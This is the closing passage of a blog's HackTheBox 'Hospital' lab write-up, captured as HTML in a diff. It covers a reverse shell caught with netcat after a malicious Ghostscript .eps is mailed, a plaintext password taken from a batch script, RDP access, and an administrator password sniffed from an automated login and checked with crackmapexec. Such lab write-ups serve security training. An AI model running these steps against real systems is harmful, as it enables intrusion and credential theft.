+</div><p>To send my payload, I attached the malicious <code>.eps</code> as a response to the first mail:</p>
+<p><img src="/post/hackthebox-hospital/Images/mail2.png"
+	width="918"
+	height="775"
+	srcset="/post/hackthebox-hospital/Images/mail2_hu8cc0c28cd0d35188d90337d53a6b2a71_107259_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/mail2_hu8cc0c28cd0d35188d90337d53a6b2a71_107259_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="118"
+		data-flex-basis="284px"
+	
+></p>
+<p>After a brief wait, I get a reverse shell connection:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Hospital/CVE-2023-36664-Ghostscript-command-injection]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 8888   
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.160.0] 6271
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">hospital\drbrown
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation-2">Privilege Escalation 2</h2>
+<h3 id="login-credentials-discovered-in-bat-script">Login credentials discovered in bat script</h3>
+<p>We can find brown&rsquo;s password is in the ghostscript.bat, the same folder location our shell is dropped into:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">users</span>\<span class="n">drbrown</span><span class="o">.</span><span class="n">hospital</span><span class="o">&gt;</span> <span class="n">type</span> <span class="n">documents</span>\<span class="n">ghostscript</span><span class="o">.</span><span class="n">bat</span>
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">echo</span> <span class="n">off</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">filename</span><span class="o">=%~</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="o">-</span><span class="n">command</span> <span class="s2">&#34;$p = convertto-securestring &#39;chr!$br0wn&#39; -asplain -force;$c = new-object system.management.automation.pscredential(&#39;hospital\drbrown&#39;, $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c &#34;</span><span class="n">C</span><span class="p">:</span>\<span class="n">Program</span><span class="err">`</span> <span class="n">Files</span>\<span class="n">gs</span>\<span class="n">gs10</span><span class="o">.</span><span class="mf">01.1</span>\<span class="n">bin</span>\<span class="n">gswin64c</span><span class="o">.</span><span class="n">exe</span><span class="s2">&#34; -dNOSAFER &#34;</span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">drbrown</span><span class="o">.</span><span class="n">HOSPITAL</span>\<span class="n">Downloads</span>\<span class="o">%</span><span class="n">filename</span><span class="o">%</span><span class="s2">&#34; }&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>drbrown:chr!$br0wn</code></p>
+<p>This user is also able to RDP connect, which we can confirm with <code>net user</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\Users\drbrown.HOSPITAL\Documents&gt; net user drbrown
+</span></span><span class="line"><span class="cl">User name                    drbrown
+</span></span><span class="line"><span class="cl">Full Name                    Chris Brown
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">Local Group Memberships      *Performance Log Users*Remote Desktop Users 
+</span></span><span class="line"><span class="cl">                             *Remote Management Use*Users                
+</span></span><span class="line"><span class="cl">Global Group memberships     *Domain Users         
+</span></span><span class="line"><span class="cl">The command completed successfully.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Seeing Remote Desktop users means we can use <code>xfreerdp</code> or similar to establish a connection, which can be helpful for GUI interaction and general persistence in the event that our reverse shell breaks.</p>
+<h3 id="spying-on-desktop-activity">Spying on desktop activity</h3>
+<p>When we enter the RDP connection, we can see <code>drbrown</code> doing login activities.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Hospital]
+</span></span><span class="line"><span class="cl">└─$ xfreerdp /u:drbrown /p:&#39;chr!$br0wn&#39; /v:hospital.htb /dynamic-resolution
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/post/hackthebox-hospital/Images/adminlogin.png"
+	width="729"
+	height="751"
+	srcset="/post/hackthebox-hospital/Images/adminlogin_hu1b358fcb2f08746b2222d6e7a060d406_52341_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/adminlogin_hu1b358fcb2f08746b2222d6e7a060d406_52341_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="97"
+		data-flex-basis="232px"
+	
+></p>
+<p>On a loop, this user will open the webmail login page, type in &ldquo;Administrator&rdquo; as the user, and presumably the associated password as well. There are many ways to retrieve this password, but here are a couple of my choice ideas:</p>
+<h4 id="moving-input-to-notepad">Moving input to notepad:</h4>
+<p>The typing method is not checking the location on where it is typing, so we can wait for the login page to be reached, then switch over to Notepad.exe, and the full login credential will be displayed for all to see.</p>
+<p><img src="/post/hackthebox-hospital/Images/notespy.png"
+	width="400"
+	height="119"
+	srcset="/post/hackthebox-hospital/Images/notespy_hua8b4605bf13eb8c00270429ec4bbfb3b_18497_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/notespy_hua8b4605bf13eb8c00270429ec4bbfb3b_18497_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="336"
+		data-flex-basis="806px"
+	
+></p>
+<h4 id="tracking-parameters-via-the-post-request">Tracking parameters via the POST request:</h4>
+<p>We can use the network monitor tool builtin to Internet Explorer and, when the &ldquo;user&rdquo; is finished typing the credentials, we can press LOGIN and examine the Request body that was sent:</p>
+<p><img src="/post/hackthebox-hospital/Images/networkmon.png"
+	width="1026"
+	height="239"
+	srcset="/post/hackthebox-hospital/Images/networkmon_hu9e82584a112d6e96c6ca08500a86dee2_113682_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/networkmon_hu9e82584a112d6e96c6ca08500a86dee2_113682_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="429"
+		data-flex-basis="1030px"
+	
+></p>
+<p>This will be URL encoded, so you replace <code>%21</code> with <code>!</code></p>
+<p><code>Administrator:Th3B3stH0sp1t4l9786!</code>
+These credentials are for the Administrator user on the system, where we can grab the root flag from Desktop.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ cme smb hospital.htb -u &#39;administrator&#39; -p &#39;Th3B3stH0sp1t4l9786!&#39;
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
+</span></span><span class="line"><span class="cl">SMB         hospital.htb    445    DC               [+] hospital.htb\administrator:Th3B3stH0sp1t4l9786! (Admin!)
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/php/">PHP</a>
+        
+            <a href="/tags/upload-filter-bypass/">Upload Filter Bypass</a>
+        
+            <a href="/tags/overlayfs/">OverlayFS</a>
+        
+            <a href="/tags/hashcat/">Hashcat</a>
+        
+            <a href="/tags/ghostscript/">GhostScript</a>
+        
+            <a href="/tags/rdp/">RDP</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-codify/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-codify/Codify.d19bf609d86d6ee490cdde52cb652366_hu3d443decdd598a8807502f48a4e7eec5_334811_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Codify"
+                        
+                        data-hash="md5-0Zv2CdhtbuSQzd5Sy2UjZg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Codify</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-analytics/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-analytics/Analytics.b761a640e4211a48e503c55ca0e36d11_hu61060dd7848f7d507a24a6dd76b66931_428424_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Analytics"
+                        
+                        data-hash="md5-t2GmQOQhGkjlA8VcoONtEQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Analytics</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-manager/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-manager/Manager.b39510e01f5140b468be0c5fc8b63ed0_hue15099997c54219d9b028a32d5d3e052_325574_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Manager"
+                        
+                        data-hash="md5-s5UQ4B9RQLRovgxfyLY&#43;0A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Manager</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-appsanity/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-appsanity/Appsanity.0223e51c64a4d8d3b0f0bd1a2973a1bc_hu82f755fa3f9a678df53f9e67501d6a70_337278_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Appsanity"
+                        
+                        data-hash="md5-AiPlHGSk2NOw8L0aKXOhvA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Appsanity</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-cozyhosting/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-cozyhosting/CozyHosting.5c10fb7439d426645511c0790ed3ccb2_hu57b040a445aedb3fdc2bc656dc9a4afd_278920_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - CozyHosting"
+                        
+                        data-hash="md5-XBD7dDnUJmRVEcB5DtPMsg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - CozyHosting</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2023 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold-1">Foothold 1</a>
+      <ol>
+        <li><a href="#abusing-file-upload-capabilities">Abusing file upload capabilities</a>
+          <ol>
+            <li><a href="#troubleshooting-php-payloads">Troubleshooting php payloads</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation-1">Privilege Escalation 1</a>
+      <ol>
+        <li><a href="#enumerating-linux-filesystem">Enumerating Linux filesystem</a></li>
+        <li><a href="#abusing-overlayfs">Abusing OverlayFS</a></li>
+      </ol>
+    </li>
+    <li><a href="#post-exploitation-collecting">Post-Exploitation Collecting</a>
+      <ol>
+        <li><a href="#cracking-password-hashes-from-shadow">Cracking password hashes from shadow</a></li>
+      </ol>
+    </li>
+    <li><a href="#foothold-2">Foothold 2</a>
+      <ol>
+        <li><a href="#accessing-roundcube-mail-service">Accessing roundcube mail service</a></li>
+        <li><a href="#rce-via-ghostscript-vulnerability">RCE via Ghostscript vulnerability</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation-2">Privilege Escalation 2</a>
+      <ol>
+        <li><a href="#login-credentials-discovered-in-bat-script">Login credentials discovered in bat script</a></li>
+        <li><a href="#spying-on-desktop-activity">Spying on desktop activity</a>
+          <ol>
+            <li><a href="#moving-input-to-notepad">Moving input to notepad:</a></li>
+            <li><a href="#tracking-parameters-via-the-post-request">Tracking parameters via the POST request:</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+
+    </body>
+</html>
